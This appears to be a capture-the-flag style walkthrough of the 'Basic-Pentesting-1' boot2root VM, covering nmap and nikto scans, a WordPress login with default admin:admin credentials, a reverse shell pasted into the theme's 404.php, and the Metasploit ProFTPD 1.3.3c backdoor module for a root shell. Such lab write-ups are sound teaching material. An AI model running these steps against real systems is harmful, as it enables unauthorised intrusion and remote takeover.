# Basic-Pentesting-1
***Description:*** This is a small boot2root VM I created for my university’s cyber security group. It contains multiple remote vulnerabilities and multiple privilege escalation vectors. I did all of my testing for this VM on VirtualBox, so that’s the recommended platform. I have been informed that it also works with VMware, but I haven’t tested this personally.  
This VM is specifically intended for newcomers to penetration testing. If you’re a beginner, you should hopefully find the difficulty of the VM to be just right.  Your goal is to remotely attack the VM and gain root privileges. Once you’ve finished, try to find other vectors you might have missed! If you enjoyed the VM or have questions, feel free to contact me at: josiah@vt.edu  If you finished the VM, please also consider posting a writeup! Writeups help you internalize what you worked on and help anyone else who might be struggling or wants to see someone else’s process. I look forward to reading them!

## Scanning

**nmap 192.168.122.144<target-ip>**

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled.png)

**nmap -sV -A 192.168.122.144 (Service version scan)**

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%201.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%201.png)

**nmap -sV -A --script vuln 192.168.122.144 (Vulnerability Scanning)**

```jsx
root@kali:~# **nmap -sV -A --script vuln 192.168.122.144**
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-05-21 03:30 EDT
Nmap scan report for 192.168.122.144
Host is up (0.0033s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
| **ftp-proftpd-backdoor**: 
|   This installation has been backdoored.
|   Command: id
|_  **Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)**
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  **/secret/**: Potentially interesting folder
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:07:5F:C6 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   3.29 ms 192.168.122.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 417.02 seconds
root@kali:~#
```

***ProFTPD 1.3.3c is vulnerable to RCE

**nikto -h http://192.168.122.144/**

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%202.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%202.png)

**Found secret directory which is wordpress

## Enumeration

Opening /secret directory in browser. First add host vtcsec in /etc/hosts

Then open vtcsec/secret/wp-login.php in browser

I tried default username and password i.e. admin:admin and it gives me access to admin user dashboard

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%203.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%203.png)

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%204.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%204.png)

## Exploitation

Now go to appearance > theme > twentyseventeen and select 404.php template

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%205.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%205.png)

Edit the content and paste reverse shell script in it and save it.

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%206.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%206.png)

start nc listener and open vtcsec/secret/wp-content/themes/twentyseventeen/404.php 

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%207.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%207.png)

It gives us shell for www-data user

**id**

**whoami**

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%208.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%208.png)

## Privilege escalation

Proftpd is vulnerable to rce and its exploit is available on metasploit. (Use reverse shell payload)

```jsx
msf6 **use exploit/unix/ftp/proftpd_133c_backdoor**
msf6 exploit(unix/ftp/proftpd_133c_backdoor) **set rhosts 192.168.122.178**
msf6 exploit(unix/ftp/proftpd_133c_backdoor) **exploit**
```

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%209.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%209.png)

***It gives us root user shell

![Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%2010.png](Basic%20Pentesting%201%20436e9ce4dd744079bb74f2c246b2b468/Untitled%2010.png)
